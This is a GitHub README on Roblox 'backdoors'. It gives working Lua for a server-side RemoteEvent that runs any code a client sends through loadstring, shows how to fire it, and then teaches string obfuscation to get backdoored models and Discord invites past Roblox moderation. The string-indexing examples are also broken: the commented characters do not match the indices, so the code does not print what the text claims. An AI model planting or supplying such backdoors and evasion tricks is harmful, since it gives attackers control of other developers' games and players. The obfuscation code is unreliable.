# Roblox Backdoors

> **NOTE FOR GITHUB:** This README is **SOLELY** for Educational and Entertainment Purposes only. Whatever people do with this is **NOT** my responsibility.
>
> SPDX-License-Identifier: MIT — see [LICENSE](https://github.com/snowylovesu/backdooring/blob/main/LICENSE).

## What is a Backdoor?
A **backdoor** is a malicious script, often hidden inside free models or assets, that gives an attacker unauthorized, server‑side control of your game. It can allow them to run code, access sensitive data, or interfere with players without your permission.

## Example

```lua
local server = Instance.new("RemoteEvent", game.ReplicatedStorage)
server.OnServerEvent:Connect(function(player, SS)
    loadstring(SS)()
end)
```

To use this, you **must** call `:FireServer` on the `RemoteEvent` you created above and pass your code as an argument, as shown below.

```lua
local server = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent")

server:FireServer([[
local hint = Instance.new("Hint")
hint.Text = "This is a hint"
hint.Parent = game.Workspace
]])
```

## Obfuscation

If you were to *try* upload a model with a Backdoor in it, Roblox **will** detect it. Roblox has started to up their moderation in 2025, and 2026 might be a bad year for exploits & serversides. This is where Obfuscation comes in. Simple obfuscation, such as shortening variables, minifying your code or encoding strings to [_decimal byte values_](https://en.wikipedia.org/wiki/Byte), that **will not work**. Obfuscation is used to **Bypass Roblox Security**, but for what?

If your code or visuals contain a **racist slur** or a Discord invite, Roblox may send a message to your account. The message will typically remind you that such content is not allowed and that you must follow the Community Guidelines. This is why obfuscation is needed, you can bypass an invite, say my Discord server invite was `discord.gg/roblox`, I would obfuscate it. Here is a small example of how that would look as an obfuscation tactic in a string.

```lua
local junk = "asdfghjklqwertyuiopzxcvbnm/"

local target = ""
target = target .. junk:sub(4,4)   -- "d"
target = target .. junk:sub(9,9)   -- "i"
target = target .. junk:sub(19,19) -- "s"
target = target .. junk:sub(3,3)   -- "c"
target = target .. junk:sub(15,15) -- "o"
target = target .. junk:sub(18,18) -- "r"
target = target .. junk:sub(5,5)   -- "d"
target = target .. junk:sub(27,27) -- "."
target = target .. junk:sub(7,7)   -- "g"
target = target .. junk:sub(7,7)   -- "g"
target = target .. junk:sub(28,28) -- "/"
target = target .. junk:sub(12,12) -- "r"
target = target .. junk:sub(15,15) -- "o"
target = target .. junk:sub(2,2)   -- "b"
target = target .. junk:sub(11,11) -- "l"
target = target .. junk:sub(15,15) -- "o"
target = target .. junk:sub(24,24) -- "x"

print(target)
```

This is called [_String Indexing_](https://en.wikipedia.org/wiki/Substring_index), and is a common move for obfuscating strings. I will show you a more _obfuscated_ version.

```lua
--[[ l: q_1/5 ]] local a="jklqopasdfmvhbnrtywzecxui/"local b="bnmzqklawxvyeopsftrhduicj/"local c="jklqopasdfmvhbnrtywzecxui/"local d="bnmzqklawxvyeopsftrhduicj/"local e="qwertopmlkjzasdfghbncyuvx/"local f="vbnmasdfqwekjlzcxyrtuoph/"local g="ytrbnmasdfopqwejklzcvhux/"local h="lkjzxcvbnmasdfqweopuyrth/"local i="asdfghjklqwertyuiopzmnxbc/"local j="oplkjhgfdsamnbvcqwertyzu/"local k="mnbvcxzlkjhgfdsapoiuytre/"local l="zxcvbnmasdfghjklqwertyop/"local m="poiuytrewqlkjhgfdsamnbvc/"local n="lkjhgfdsamnbvcxqwertyuiop/"local o="asdfqwerzxcvtyuiohjklmnvb/"local p=""p=p..e:sub(9,9)p=p..l:sub(14,14)p=p..c:sub(19,19)p=p..h:sub(3,3)p=p..f:sub(15,15)p=p..j:sub(18,18)p=p..b:sub(5,5)p=p..o:sub(27,27)p=p..g:sub(7,7)p=p..k:sub(7,7)p=p..a:sub(28,28)p=p..d:sub(12,12)p=p..m:sub(15,15)p=p..i:sub(2,2)p=p..n:sub(11,11)p=p..f:sub(15,15)p=p..l:sub(24,24)print(p)
```

As you can most likely see, this is hard to understand. All of this _just_ to print "`discord.gg/roblox`"

## Conclusion
All that code above is only to output a simple Discord invite. The technique may seem complicated at first, but once you understand **string indexing** and **substrings**, it becomes much simpler.

Roblox is increasing moderation efforts, and techniques like this are sometimes used to bypass overly simplistic detections, so understanding string obfuscation is a useful skill.

Thank you for reading!

If you are interested in creating Modules and learning more advanced scripting techniques, those documentations will be coming out very soon.

Documentation made by `snxwynights.` on Discord and `snowylovesu` on GitHub.
